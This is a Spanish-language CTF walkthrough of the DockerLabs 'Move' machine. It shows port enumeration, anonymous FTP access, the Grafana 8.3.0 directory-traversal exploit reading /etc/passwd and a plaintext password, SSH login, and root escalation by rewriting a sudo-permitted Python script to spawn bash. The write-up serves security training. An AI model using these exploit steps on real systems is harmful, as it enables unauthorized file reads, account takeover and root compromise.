# Move
![imgmove](https://github.com/TBrux/DOCKERLABS/assets/168732212/3985d561-216b-45c6-b17d-93fd010dee69)

## Reconocimiento y Enumeración.

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT     STATE SERVICE REASON
21/tcp   open  ftp     syn-ack ttl 64
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
```

Como tenemos abiertos los puertos 21, 22, 80 y 3000 vamos a comprobar la versión y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p21,22,80,3000 -vvv -oN versionPorts 172.17.0.2
```
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p21,22,80,3000`: Escaneo de los puertos.
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.
```
```
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    1 0        0            4096 Mar 29 09:28 mantenimiento [NSE: writeable]
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   256 77:0b:34:36:87:0d:38:64:58:c0:6f:4e:cd:7a:3a:99 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIPBJIszEeSdX26reEr3kMVBaZkDMuE0vMsxFn8KknUZJRzDKlY5eVs2m9ffGfuN4uCaKtnuCyGklffzxXWGSVQ=
|   256 1e:c6:b2:91:56:32:50:a5:03:45:f3:f7:32:ca:7b:d6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/kaSLl6P5jIseZeGoVzBe/kBenhuj7zboILbh6LEA3
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.58 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
3000/tcp open  ppp?    syn-ack ttl 64
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
```
Lo primero que vamos a hacer es comprobar el puerto 21 ya que vemos que tiene el usuario Anonymous activado.
```
❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:tbrux): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29003|)
150 Here comes the directory listing.
drwxrwxrwx    1 0        0            4096 Mar 29 09:28 mantenimiento
226 Directory send OK.
ftp> cd mantenimiento
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||5507|)
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0            2021 Mar 29 09:26 database.kdbx
226 Directory send OK.
ftp>
```
Vemos que podemos descargarnos un archivo de una base de datos de keepass. Nos lo descargamos y probamos a utilizarlo con **keepass2** pero tiene contraseña, así que vamos a ver que encontramos por el puerto 80.
```bash
❯ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/maintenance.html     (Status: 200) [Size: 63]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
Probamos a ver si encontramos algo en la página **/maintenance.html**, que es la única que llama la atención y vemos que hay un mensaje que tendremos en cuenta cuando tengamos acceso a la máquina.

![move](https://github.com/TBrux/DOCKERLABS/assets/168732212/77343f47-7ba7-4fed-9786-a5c6f242363b)

Cómo no vemos nada más en el puerto 80, vamos a ver que encontramos en el puerto 3000, y nos encontramos con un panel de login de Grafana v8.3.0.

![grafana](https://github.com/TBrux/DOCKERLABS/assets/168732212/1d77444d-d660-4e2c-b079-4b5047c181f2)

## Explotación.
Vamos a comprobar si hay alguna exploit para esta versión de grafana.
```bash
❯ searchsploit grafana 8.3.0
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                            |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                                                               | multiple/webapps/50581.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
Ahora nos descargamos el exploit a nuestro ordenador.
```bash
searchsploit -m multiple/webapps/50581.py
```
```
❯ python3 50581.py -H http://172.17.0.2:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```
Vemos que el exploit nos permite leer archivos del sistema y recordemos que en el puerto 80 nos ponía una ruta para visitar **/tmp/pass.txt**.
```
Read file > /tmp/pass.txt
t9sH76gpQ82UFeZ3GXZS
```
Ahora mismo tenemos una contraseña y cuando hemos leído el **/etc/passwd** había un usuario llamado **freddy**, así que podemos probar a conectarnos por **ssh** con estas credenciales.
```bash
ssh freddy@172.17.0.2
```
Efectivamente, con estas credenciales tenemos acceso por ssh al usuario freddy.
```
┌──(freddy㉿2742d7ddff34)-[~]
└─$ whoami                                                                                                                                                                                                                                 
freddy
```
## Escalada de privilegios.
Una vez dentro, empezamos con la escalada de privilegios viendo si tenemos algún archivo que podemos utilizar con permisos de root desde el usuario **freddy**.
```
┌──(freddy㉿2742d7ddff34)-[~]
└─$ sudo -l                                                                                                                                                                                                                                
Matching Defaults entries for freddy on 2742d7ddff34:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddy may run the following commands on 2742d7ddff34:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py

```
```
──(freddy㉿2742d7ddff34)-[~]
└─$ ll /opt/maintenance.py 
-rw-r--r-- 1 freddy freddy 35 Mar 29 09:29 /opt/maintenance.py
```
Vemos que somos el propietario del archivo, así que vamos a cambiar el contenido del script para lanzar una bash como el usuario **root**.
```python
import os
os.system("/usr/bin/python3 -c 'import os; os.system(\"/bin/bash\")'")
```
Una vez modificado el script de python, lo ejecutamos y ya tenemos una bash como **root**.
```
┌──(freddy㉿2742d7ddff34)-[~]
└─$ sudo -u root /usr/bin/python3 /opt/maintenance.py 
┌──(root㉿2742d7ddff34)-[/home/freddy]
└─# whoami
root
```



